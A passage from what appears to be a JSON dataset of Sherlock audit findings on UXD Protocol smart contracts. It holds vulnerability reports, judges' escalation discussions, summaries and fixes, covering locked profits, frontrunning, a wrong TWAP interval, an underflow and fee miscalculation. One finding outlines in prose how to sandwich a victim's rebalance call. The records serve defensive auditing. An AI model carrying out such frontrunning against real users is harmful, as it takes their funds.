      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/251 \n\n## Found by \n0x52\n\n## Summary\n\nPerpDepository has no way to calculate or withdraw any profits made by the vault. By [design](https://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/rage-trade/RageDnDepository.sol#L99-L115) stakes are entitled to a portion of the profits generated by the delta-neutral strategy. The issue is that the vault never implements a way to withdraw profits to stakers, resulting in loss of revenue for them.\n\n## Vulnerability Detail\n\nSee summary.\n\n## Impact\n\nProfits owed stakers will be trapped in the contract and they will lose that portion of their revenue\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L25\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nCreate a function to calculate and withdraw protocol profit to be awarded to stakers\n\n## Discussion\n\n**WarTech9**\n\nProfits on `PerpDepository` are currently locked in the depository and can be unlocked in future updates through positive PnL rebalancing.\n`RageDepository` profits are locked in that contract and can be withdrawn by the contract owner (governance) through the `withdrawProfits()` function\n\n**rvierdiyev**\n\nEscalate for 11 USDC.\n\nThis is not a vulnerability.\nAs @WarTech9 said, \n>`RageDepository` profits are locked in that contract and can be withdrawn by the contract owner (governance) through the `withdrawProfits()` function\n\nThis is design choice of protocol. I have discussed that during the contest with @WarTech9, so he explained me that and i didn't submit that as issue. As he said, that rewards are not lost and governance can withdraw it later to reuse.\n\nAlso author of report states in impact section that:\n> Profits owed stakers will be trapped in the contract and they will lose that portion of their revenue\n\nBut this is not true, as i described above, that value is not stucked as protocol can withdraw it.\n\n**sherlock-admin**\n\n > Escalate for 11 USDC.\n> \n> This is not a vulnerability.\n> As @WarTech9 said, \n> >`RageDepository` profits are locked in that contract and can be withdrawn by the contract owner (governance) through the `withdrawProfits()` function\n> \n> This is design choice of protocol. I have discussed that during the contest with @WarTech9, so he explained me that and i didn't submit that as issue. As he said, that rewards are not lost and governance can withdraw it later to reuse.\n> \n> Also author of report states in impact section that:\n> > Profits owed stakers will be trapped in the contract and they will lose that portion of their revenue\n> \n> But this is not true, as i described above, that value is not stucked as protocol can withdraw it.\n\nYou've created a valid escalation for 11 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation rejected\n\nThis is in PerpDepository and not RageDepository. Profits in PerpDepository are stuck with no method to unlock them except while upgrading the contract. \nAlthough contract upgrades are to be used for feature updates and add changes to handle extreme situations, this issue is clearly a smart contract bug where funds are locked.  \n\n**sherlock-admin**\n\n> Escalation rejected\n> \n> This is in PerpDepository and not RageDepository. Profits in PerpDepository are stuck with no method to unlock them except while upgrading the contract. \n> Although contract upgrades are to be used for feature updates and add changes to handle extreme situations, this issue is clearly a smart contract bug where funds are locked.  \n\nThis issue's escalations have been rejected!\n\nWatsons who escalated this issue will have their escalation amount deducted from their next payout.\n\n**WarTech9**\n\nThis is not a valid issue. This is conflating `RageDnDepository` and `PerpDepository`. \n`PerpDepository` does not need a way to withdraw profits as there is none, since it applies a delta-neutral strategy.\n`RageDnDepository` already has a `withdrawProfits()` function\n\n**hrishibhat**\n\nConsidering this issue valid, since the funds are stuck in the contract until an upgrade.",
      "summary": "\nThis bug report is regarding the issue M-12, where PerpDepository has no way to calculate or withdraw any profits made by the vault. By design, stakes are entitled to a portion of the profits generated by the delta-neutral strategy, but the issue is that the vault never implements a way to withdraw profits to stakers, resulting in loss of revenue for them. This means that the profits owed to stakers will be trapped in the contract and they will lose that portion of their revenue. The code snippet linked to this issue is https://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L25. \n\nThe tool used to find this bug was Manual Review. The recommendation is to create a function to calculate and withdraw protocol profit to be awarded to stakers. Initially, the escalations for this issue were rejected as this is not a valid issue, since it is conflating RageDnDepository and PerpDepository. However, it was later considered valid since the funds are stuck in the contract until an upgrade.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/251",
      "tags": [],
      "finders": [
        "0x52",
        "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/251"
      ]
    },
    {
      "id": "6593",
      "title": "H-6: User specified slippage allows frontrunning",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/192 \n\n## Found by \nzeroknots, minhtrng, keccak123, peanuts, ck, HollaDieWaldfee, HonorLt, koxuan, GimelSec, wagmi, yixxas, jonatascm\n\n## Summary\n\n`rebalance` and `rebalanceLite` can be called by any user. Assets are taken from a user specified `account` address which has approved PerpDepository. If an address has a non-zero approval for PerpDepository, a frontrunner can use `rebalance` to transfer funds and profit by sandwiching the Uniswap pool swap.\n\n## Vulnerability Detail\n\nWhen `mint` or `redeem` is called in UXDController, `msg.sender` is where the value is coming from. But `rebalance` allows for the caller to specify [the `account` where funds are coming from](https://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L452). This means `msg.sender` can be any address. This allows for different scenarios where a frontrunner can profit with these steps.\n1. a frontrunner detects a call of `rebalance` transaction in the mempool for a certain account address\n2. the frontrunner duplicates the transaction but increases the gas amount (to allow frontrunning the original transaction) and changes the `amountOutMinimum` value to zero\n3. the frontrunner can profit by sandwiching the Uniswap swap which now has no slippage setting\n4. The user will lose value \n\n## Impact\n\nAn account that is used in `rebalance` can lose value\n\n## Code Snippet\n\n`rebalance` can be frontrun\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L446\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\n`rebalance` and `rebalanceLite` should use `msg.sender` to replace the function argument account address.\n\n## Discussion\n\n**WarTech9**\n\nThis is a duplicate of #288 \n\n**IAm0x52**\n\nFixed in same PR as #288",
      "summary": "\nThis bug report is about the vulnerability found in the `rebalance` and `rebalanceLite` functions of UXDController. These functions can be called by any user and the funds are taken from a user-specified `account` address. If this address has a non-zero approval for PerpDepository, a frontrunner can use `rebalance` to transfer funds and profit by sandwiching the Uniswap pool swap. This will lead to the user losing value. Manual review was used to detect the vulnerability. The bug was fixed in the same PR as #288. The recommendation for this bug is that `rebalance` and `rebalanceLite` should use `msg.sender` to replace the function argument account address.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/192",
      "tags": [
        "Front-Running",
        "Slippage"
      ],
      "finders": [
        "keccak123",
        "zeroknots",
        "HollaDieWaldfee",
        "yixxas",
        "koxuan",
        "GimelSec",
        "peanuts",
        "wagmi",
        "HonorLt",
        "minhtrng",
        "jonatascm",
        "ck"
      ]
    },
    {
      "id": "6592",
      "title": "H-5: PerpDepository#getPositionValue uses incorrect value for TWAP interval allowing more than intended funds to be extracted",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/249 \n\n## Found by \nberndartmueller, DecorativePineapple, cccz, HonorLt, 0x52, ctf\\_sec, 0Kage\n\n## Summary\n\nPerpDepository#getPositionValue queries the exchange for the mark price to calculate the unrealized PNL. Mark price is defined as the 15 minute TWAP of the market. The issue is that it uses the 15 second TWAP instead of the 15 minute TWAP\n\n## Vulnerability Detail\n\nAs stated in the [docs](https://support.perp.com/hc/en-us/articles/5331299807513-Liquidation) and as implemented in the [ClearHouseConfig](https://optimistic.etherscan.io/address/0xa4c817a425d3443baf610ca614c8b11688a288fb#readProxyContract) contract, the mark price is a 15 minute / 900 second TWAP.\n\n    function getPositionValue() public view returns (uint256) {\n        uint256 markPrice = getMarkPriceTwap(15);\n        int256 positionSize = IAccountBalance(clearingHouse.getAccountBalance())\n            .getTakerPositionSize(address(this), market);\n        return markPrice.mulWadUp(_abs(positionSize));\n    }\n\n    function getMarkPriceTwap(uint32 twapInterval)\n        public\n        view\n        returns (uint256)\n    {\n        IExchange exchange = IExchange(clearingHouse.getExchange());\n        uint256 markPrice = exchange\n            .getSqrtMarkTwapX96(market, twapInterval)\n            .formatSqrtPriceX96ToPriceX96()\n            .formatX96ToX10_18();\n        return markPrice;\n    }\n\nAs seen in the code above getPositionValue uses 15 as the TWAP interval. This means it is pulling a 15 second TWAP rather than a 15 minute TWAP as intended.\n\n## Impact\n\nThe mark price and by extension the position value will frequently be different from true mark price of the market allowing for larger rebalances than should be possible.\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L708-L713\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nI recommend pulling pulling the TWAP fresh each time from ClearingHouseConfig, because the TWAP can be changed at anytime. If it is desired to make it a constant then it should at least be changed from 15 to 900.\n\n## Discussion\n\n**hrishibhat**\n\nFix: https://github.com/UXDProtocol/uxd-evm/pull/21\n\n\n**IAm0x52**\n\nFix looks good. TWAP corrected from 15 to 900",
      "summary": "\nThis bug report is about an issue found in the PerpDepository#getPositionValue function which queries the exchange for the mark price to calculate the unrealized PNL. The issue is that it uses the 15 second TWAP instead of the 15 minute TWAP, as defined in the documentation and the ClearHouseConfig contract. This means the mark price and by extension the position value will frequently be different from the true mark price of the market, allowing for larger rebalances than should be possible. The bug was found by berndartmueller, DecorativePineapple, cccz, HonorLt, 0x52, ctf\\_sec, and 0Kage. The code snippet which shows the bug can be found at https://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L708-L713. The recommended fix is to pull the TWAP fresh each time from ClearingHouseConfig, or make it a constant and change it from 15 to 900. The fix was proposed by hrishibhat and was accepted by IAm0x52.",
      "quality_score": 5,
      "rarity_score": 5,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/249",
      "tags": [],
      "finders": [
        "DecorativePineapple",
        "0x52",
        "cccz",
        "berndartmueller",
        "0Kage",
        "HonorLt",
        "ctf\\_sec"
      ]
    },
    {
      "id": "6591",
      "title": "H-4: USDC deposited to PerpDepository.sol are irretrievable and effectively causes UDX to become undercollateralized",
      "impact": "HIGH",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/250 \n\n## Found by \n0x52, csanuragjain\n\n## Summary\n\nPerpDepository rebalances negative PNL into USDC holdings. This preserves the delta neutrality of the system by exchanging base to quote. This is problematic though as once it is in the vault as USDC it can never be withdrawn. The effect is that the delta neutral position can never be liquidated but the USDC is inaccessible so UDX is effectively undercollateralized. \n\n## Vulnerability Detail\n\n`_processQuoteMint`, `_rebalanceNegativePnlWithSwap` and `_rebalanceNegativePnlLite` all add USDC collateral to the system. There were originally two ways in which USDC could be removed from the system. The first was positive PNL rebalancing, which has now been deactivated. The second is for the owner to remove the USDC via `withdrawInsurance`.\n\n    function withdrawInsurance(uint256 amount, address to)\n        external\n        nonReentrant\n        onlyOwner\n    {\n        if (amount == 0) {\n            revert ZeroAmount();\n        }\n\n        insuranceDeposited -= amount;\n\n        vault.withdraw(insuranceToken(), amount);\n        IERC20(insuranceToken()).transfer(to, amount);\n\n        emit InsuranceWithdrawn(msg.sender, to, amount);\n    }\n\nThe issue is that `withdrawInsurance` cannot actually redeem any USDC. Since insuranceDeposited is a uint256 and is decremented by the withdraw, it is impossible for more USDC to be withdrawn then was originally deposited.\n\nThe result is that there is no way for the USDC to ever be redeemed and therefore over time will lead to the system becoming undercollateralized due to its inaccessibility.\n\n## Impact\n\nUDX will become undercollateralized and the ecosystem will spiral out of control\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L478-L528\n\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L615-L644\n\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L385-L397\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nAllow all USDC now deposited into the insurance fund to be redeemed 1:1\n\n## Discussion\n\n**hrishibhat**\n\nFix: https://github.com/UXDProtocol/uxd-evm/pull/32\n\n**IAm0x52**\n\nFix looks good. Quote redeeming has been enabled. I would recommend removing redundant onlyController modifier on _processQuoteRedeem",
      "summary": "\nIn this bug report, it is stated that USDC which is deposited to PerpDepository.sol are irretrievable and it causes UDX to become undercollateralized. It was found by 0x52 and csanuragjain. This is caused by the fact that the only way to remove USDC from the system is positive PNL rebalancing which has now been deactivated and the owner can remove the USDC via withdrawInsurance. However, withdrawInsurance cannot actually redeem any USDC as it is impossible for more USDC to be withdrawn then was originally deposited. This means that the USDC is inaccessible, leading to UDX becoming undercollateralized. The impact of this is that the ecosystem will spiral out of control. A fix was proposed by hrishibhat and IAm0x52 which was accepted. The fix enabled quote redeeming and removed the redundant onlyController modifier on _processQuoteRedeem.",
      "quality_score": 5,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/250",
      "tags": [],
      "finders": [
        "csanuragjain",
        "0x52",
        "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/250"
      ]
    },
    {
      "id": "6270",
      "title": "M-12: PerpDepository.netAssetDeposits variable can prevent users to withdraw with underflow error",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/97 \n\n## Found by \nrvierdiiev\n\n## Summary\nPerpDepository.netAssetDeposits variable can prevent users to withdraw with underflow error\n## Vulnerability Detail\nWhen user deposits using PerpDepository, then `netAssetDeposits` variable is increased with the base assets amount, provided by depositor.\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L283-L288\n```solidity\n    function _depositAsset(uint256 amount) private {\n        netAssetDeposits += amount;\n\n\n        IERC20(assetToken).approve(address(vault), amount);\n        vault.deposit(assetToken, amount);\n    }\n```\n\nAlso when user withdraws, this `netAssetDeposits` variable is decreased with base amount that user has received for redeeming his UXD tokens.\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L294-L302\n```solidity\n    function _withdrawAsset(uint256 amount, address to) private {\n        if (amount > netAssetDeposits) {\n            revert InsufficientAssetDeposits(netAssetDeposits, amount);\n        }\n        netAssetDeposits -= amount;\n\n\n        vault.withdraw(address(assetToken), amount);\n        IERC20(assetToken).transfer(to, amount);\n    }\n```\n\nThe problem here is that when user deposits X assets, then he receives Y UXD tokens. And when later he redeems his Y UXD tokens he can receive more or less than X assets. This can lead to situation when netAssetDeposits variable will be seting to negative value which will revert tx.\n\nExample.\n1.User deposits 1 WETH when it costs 1200$. As result 1200 UXD tokens were minted and netAssetDeposits was set to 1.\n2.Price of WETH has decreased and now it costs 1100.\n3.User redeem his 1200 UXD tokens and receives from perp protocol 1200/1100=1.09 WETH. But because netAssetDeposits is 1, then transaction will revert inside `_withdrawAsset` function with underflow error.\n## Impact\nUser can't redeem all his UXD tokens.\n## Code Snippet\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L264-L278\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L294-L302\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L240-L253\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L283-L288\n## Tool used\n\nManual Review\n\n## Recommendation\nAs you don't use this variable anywhere else, you can remove it.\nOtherwise you need to have 2 variables instead: totalDeposited and totalWithdrawn. \n\n## Discussion\n\n**WarTech9**\n\nOne fix: `netAssetDeposits` should be updated during rebalancing.\n\n**WarTech9**\n\n@acamill This _can only be partially fixed_ by updating `netAssetsDeposits` while rebalancing but that's only resolves the issue if rebalancing has occurred. It would still be possible to run into this if rebalancing has not yet occurred so its not a full fix. \nWe could use 2 variables as suggested but due to changes in asset values between mints and redeems, those would diverge and would be meaningless. \nWe already have the position size which tells us this information, thus removing this field is the better option.\n\n**0x00052**\n\nEscalate for 25 USDC\n\nThis should only be medium severity because it is an edge case for the following reasons:\n1) It can only occur if the average withdraw price is chronically under the average deposit price.\n2) It only affects the tail end of withdraws, requiring a majority of the depository to be withdrawn\n3) This state is not permanent because later deposits/withdraws can function in reverse (i.e. deposited at 1100 and withdraw at 1200) to cause netAssetsDeposits to go back up and free stuck assets\n\n**sherlock-admin**\n\n > Escalate for 25 USDC\n> \n> This should only be medium severity because it is an edge case for the following reasons:\n> 1) It can only occur if the average withdraw price is chronically under the average deposit price.\n> 2) It only affects the tail end of withdraws, requiring a majority of the depository to be withdrawn\n> 3) This state is not permanent because later deposits/withdraws can function in reverse (i.e. deposited at 1100 and withdraw at 1200) to cause netAssetsDeposits to go back up and free stuck assets\n\nYou've created a valid escalation for 25 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation accepted\n\nGiven the certain specific requirements for the issue to occur, also note that there the condition can correct itself to free stuck assets.\nConsidering this issue as medium\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> Given the certain specific requirements for the issue to occur, also note that there the condition can correct itself to free stuck assets.\n> Considering this issue as medium\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.",
      "summary": "\nThis bug report is about the PerpDepository.netAssetDeposits variable, which can prevent users from withdrawing their funds due to an underflow error. This variable is increased when users deposit base assets and decreased when users withdraw UXD tokens. The problem is that when the user redeems their UXD tokens, they may receive more or less than the base assets they deposited, leading to a negative value for the netAssetDeposits variable and a transaction revert. This issue is considered to be of medium severity, as it only occurs under certain specific conditions and can correct itself. The recommended solution is to remove the variable, or to use two variables (totalDeposited and totalWithdrawn) instead. If accepted, contestants' payouts and scores will be updated accordingly.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/97",
      "tags": [
        "Overflow/Underflow",
        "Don't update state"
      ],
      "finders": [
        "rvierdiiev"
      ]
    },
    {
      "id": "6269",
      "title": "M-11: PerpDepository#_placePerpOrder miscalculates fees paid when shorting",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/271 \n\n## Found by \nJeiwan, 0x52, berndartmueller, cccz, rvierdiiev, GimelSec, peanuts, keccak123\n\n## Summary\n\nPerpDepository#_placePerpOrder calculates the fee as a percentage of the quoteToken received. The issue is that this amount already has the fees taken so the fee percentage is being applied incorrectly.\n\n## Vulnerability Detail\n\n    function _placePerpOrder(\n        uint256 amount,\n        bool isShort,\n        bool amountIsInput,\n        uint160 sqrtPriceLimit\n    ) private returns (uint256, uint256) {\n        uint256 upperBound = 0; // 0 = no limit, limit set by sqrtPriceLimit\n\n        IClearingHouse.OpenPositionParams memory params = IClearingHouse\n            .OpenPositionParams({\n                baseToken: market,\n                isBaseToQuote: isShort, // true for short\n                isExactInput: amountIsInput, // we specify exact input amount\n                amount: amount, // collateral amount - fees\n                oppositeAmountBound: upperBound, // output upper bound\n                // solhint-disable-next-line not-rely-on-time\n                deadline: block.timestamp,\n                sqrtPriceLimitX96: sqrtPriceLimit, // max slippage\n                referralCode: 0x0\n            });\n\n        (uint256 baseAmount, uint256 quoteAmount) = clearingHouse.openPosition(\n            params\n        );\n\n        uint256 feeAmount = _calculatePerpOrderFeeAmount(quoteAmount);\n        totalFeesPaid += feeAmount;\n\n        emit PositionOpened(isShort, amount, amountIsInput, sqrtPriceLimit);\n        return (baseAmount, quoteAmount);\n    }\n\n    function _calculatePerpOrderFeeAmount(uint256 amount)\n        internal\n        view\n        returns (uint256)\n    {\n        return amount.mulWadUp(getExchangeFeeWad());\n    }\n\nWhen calculating fees, `PerpDepository#_placePerpOrder` use the quote amount retuned when opening the new position. It always uses exactIn which means that for shorts the amount of baseAsset being sold is specified. The result is that quote amount returned is already less the fees. If we look at how the fee is calculated we can see that it is incorrect.\n\nExample:\nImagine the market price of ETH is $1000 and there is a market fee of 1%. The 1 ETH is sold and the contract receives 990 USD. Using the math above it would calculated the fee as $99 (990 * 1%) but actually the fee is $100.\n\nIt have submitted this as a medium because it is not clear from the given contracts what the fee totals are used for and I cannot fully assess the implications of the fee value being incorrect.\n\n## Impact\n\ntotalFeesPaid will be inaccurate which could lead to disparities in other contracts depending on how it is used\n\n## Code Snippet\n\nhttps://github.com/sherlock-audit/2023-01-uxd/blob/main/contracts/integrations/perp/PerpDepository.sol#L804-L810\n\n## Tool used\n\nManual Review\n\n## Recommendation\n\nRewrite _calculatePerpOrderFeeAmount to correctly calculate the fees paid:\n\n    -   function _calculatePerpOrderFeeAmount(uint256 amount)\n    +   function _calculatePerpOrderFeeAmount(uint256 amount, bool isShort)\n            internal\n            view\n            returns (uint256)\n        {\n    +       if (isShort) {\n    +           return amount.divWadDown(WAD - getExchangeFeeWad()) - amount;\n    +       } else {\n                return amount.mulWadUp(getExchangeFeeWad());\n    +       }\n        }",
      "summary": "\nThis bug report is about an issue found in the PerpDepository#_placePerpOrder function of the Sherlock Audit project. The issue is that the function miscalculates the fees paid when shorting, as the fee percentage is being applied incorrectly. The code snippet provided shows that the fee amount is calculated using the quote amount returned when opening the new position, which already has the fees taken. This means that the fee percentage is being applied incorrectly. \n\nThe impact of this issue is that totalFeesPaid will be inaccurate, which could lead to disparities in other contracts depending on how it is used. The bug was found by a group of people including Jeiwan, 0x52, berndartmueller, cccz, rvierdiiev, GimelSec, peanuts, and keccak123 and was found using manual review. \n\nThe recommendation given is to rewrite the function _calculatePerpOrderFeeAmount to correctly calculate the fees paid. The code snippet provided shows what the rewritten function should look like.",
      "quality_score": 4,
      "rarity_score": 4,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "UXD Protocol",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2023-01-uxd-judging/issues/271",
      "tags": [
        "Wrong Math"
      ],
      "finders": [
        "keccak123",
        "0x52",
        "cccz",
        "Jeiwan",
        "berndartmueller",
        "peanuts",
        "rvierdiiev",
        "GimelSec"
      ]
    },
    {
      "id": "6268",
      "title": "M-10: The `FullMath` library is unable to handle intermediate overflows due to overflow that's desired but never reached",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2023-01-uxd-judging/issues/273 \n\n## Found by \nDecorativePineapple\n\n## Summary\nThe [`FullMath`](https://github.com/sherlock-audit/2023-01-uxd/blob/2f3e8890ba64331be08b690018f93d3b67e82c11/contracts/libraries/FullMath.sol#L10) library doesn't correctly handle the case when an intermediate value overflows 256 bits. This happens because an overflow is desired in this case but it's never reached.\n\n## Vulnerability Detail\nThe [`FullMath`](https://github.com/sherlock-audit/2023-01-uxd/blob/2f3e8890ba64331be08b690018f93d3b67e82c11/contracts/libraries/FullMath.sol#L10) library was taken from [Uniswap v3-core](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol). However, the original solidity version that was used was < 0.8.0, meaning that the execution didn't revert wan an overflow was reached. This effectively means that when a phantom overflow (a multiplication and division where an intermediate value overflows 256 bits) occurs the execution will revert and the correct result won't be returned. The original library was designed in a way that could handle intermediate overflows.\nThe [`FullMath`](https://github.com/sherlock-audit/2023-01-uxd/blob/2f3e8890ba64331be08b690018f93d3b67e82c11/contracts/libraries/FullMath.sol#L10) library is used in the [`MathLib library`](https://github.com/sherlock-audit/2023-01-uxd/blob/2f3e8890ba64331be08b690018f93d3b67e82c11/contracts/libraries/MathLib.sol#L7) in order to format an 18-decimal number to a FixedPoint 96.Q96 number.\n\n## Impact\nThe correct result isn't returned in this case and the execution gets reverted when a phantom overflows occurs.\n\n## Code Snippet\nThe [`FullMath`](https://github.com/sherlock-audit/2023-01-uxd/blob/2f3e8890ba64331be08b690018f93d3b67e82c11/contracts/libraries/FullMath.sol#L10) library which doesn't use an unchecked block:\n\n```solidity\nlibrary FullMath {\n    /// @notice Calculates floor(abdenominator) with full precision. Throws if result overflows a uint256 or denominator == 0\n    /// @param a The multiplicand\n    /// @param b The multiplier\n    /// @param denominator The divisor\n    /// @return result The 256-bit result\n    /// @dev Credit to Remco Bloemen under MIT license https://xn--2-umb.com/21/muldiv\n    function mulDiv(\n        uint256 a,\n        uint256 b,\n        uint256 denominator\n    ) internal pure returns (uint256 result) {\n        // 512-bit multiply [prod1 prod0] = a * b\n        // Compute the product mod 2**256 and mod 2**256 - 1\n        // then use the Chinese Remainder Theorem to reconstruct\n        // the 512 bit result. The result is stored in two 256\n        // variables such that product = prod1 * 2**256 + prod0\n        uint256 prod0; // Least significant 256 bits of the product\n\n        ...\n\n      result = prod0 * inv;\n        return result;\n    }\n\n    function mulDivRoundingUp(\n        uint256 a,\n        uint256 b,\n        uint256 denominator\n    ) internal pure returns (uint256 result) {\n        result = mulDiv(a, b, denominator);\n        if (mulmod(a, b, denominator) > 0) {\n            require(result < type(uint256).max);\n            result++;\n        }\n    }\n}\n```\n\n## Tool used\nManual Code Review\n\n## Recommendation\nIt is advised to put the entire function bodies of `mulDiv` and `mulDivRoundingUp` in an unchecked block. A modified version of the original `Fullmath` library that uses unchecked blocks to handle the overflow, can be found in the `0.8` branch of the [Uniswap v3-core repo](https://github.com/Uniswap/v3-core/blob/0.8/contracts/libraries/FullMath.sol).\n\n## Discussion\n\n**WarTech9**\n\nUnchecked doesn't handle the error, any overflow/underflow would fail silently. upgrading to the newer version of Fullmath should would be good though but is low priority.\n\n**hrishibhat**\n\nAgree with sponsor comment. Considering the issue as informational\n\n**DecorativePineapple**\n\nEscalate for 15 USDC\n\nAs noted in the [FullMath](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) library, it was designed in order to handle \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits.\nThis means that the **original** library can handle statements like : `FullMath.mulDiv(type(uint256).max / 2, 3, 111))` . \nThis a feature of the library, as statements like this cannot be handled by solidity `>0.8` directly as the execution will revert due to an overflow. Because the original library was created with solidity version `<0.8.0`(which doesn't revert on overflows) this behaviour was allowed as the **expected** intermediatory overflow could be reached. \n\nHowever, due to the fact that the FullMath Library was ported to solidity version [`0.8.9`](https://github.com/sherlock-audit/2023-01-uxd/blob/334b38b582d794c76a2062e672804d99fc24675c/contracts/libraries/FullMath.sol#L2), which is \n`>0.8`, this operation would revert as the intermediate calculations would overflow, meaning that it can't handle those multiplication and division where an intermediate value overflows the 256 bits.\nThe fix is to mark the full body in an unchecked block, in order to leverage the fact that the original version was designed in order to allow the intermediate overflow. \n\nI think that the comment left by the sponsor: `Unchecked doesn't handle the error,` , doesn't reflect the issue, as by using the unchecked block the desired behaviour could be reached.\n\nA modified version of the original Fullmath library that uses unchecked blocks to handle the **intended** overflow, can be found in the 0.8 branch of the [Uniswap v3-core repo](https://github.com/Uniswap/v3-core/blob/0.8/contracts/libraries/FullMath.sol).\n\n**sherlock-admin**\n\n > Escalate for 15 USDC\n> \n> As noted in the [FullMath](https://github.com/Uniswap/v3-core/blob/main/contracts/libraries/FullMath.sol) library, it was designed in order to handle \"phantom overflow\" i.e., allows multiplication and division where an intermediate value overflows 256 bits.\n> This means that the **original** library can handle statements like : `FullMath.mulDiv(type(uint256).max / 2, 3, 111))` . \n> This a feature of the library, as statements like this cannot be handled by solidity `>0.8` directly as the execution will revert due to an overflow. Because the original library was created with solidity version `<0.8.0`(which doesn't revert on overflows) this behaviour was allowed as the **expected** intermediatory overflow could be reached. \n> \n> However, due to the fact that the FullMath Library was ported to solidity version [`0.8.9`](https://github.com/sherlock-audit/2023-01-uxd/blob/334b38b582d794c76a2062e672804d99fc24675c/contracts/libraries/FullMath.sol#L2), which is \n> `>0.8`, this operation would revert as the intermediate calculations would overflow, meaning that it can't handle those multiplication and division where an intermediate value overflows the 256 bits.\n> The fix is to mark the full body in an unchecked block, in order to leverage the fact that the original version was designed in order to allow the intermediate overflow. \n> \n> I think that the comment left by the sponsor: `Unchecked doesn't handle the error,` , doesn't reflect the issue, as by using the unchecked block the desired behaviour could be reached.\n> \n> A modified version of the original Fullmath library that uses unchecked blocks to handle the **intended** overflow, can be found in the 0.8 branch of the [Uniswap v3-core repo](https://github.com/Uniswap/v3-core/blob/0.8/contracts/libraries/FullMath.sol).\n\nYou've created a valid escalation for 15 USDC!\n\nTo remove the escalation from consideration: Delete your comment.\nTo change the amount you've staked on this escalation: Edit your comment **(do not create a new comment)**.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**hrishibhat**\n\nEscalation accepted\n\nAgree that there could a potential overflow, & it must be updated to latest FullMath version. \nConsidering this a valid medium issue.\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> Agree that there could a potential overflow, & it must be updated to latest FullMath version. \n> Considering this a valid medium issue\n\nThis issue's escalations have been accepted!\n\nContestants' payouts and scores will be updated according to the changes made on this issue.\n\n**sherlock-admin**\n\n> Escalation accepted\n> \n> Agree that there could a potential overflow, & it must be updated to latest FullMath version. \n> Considering this a valid medium issue.\n\nThis issue's 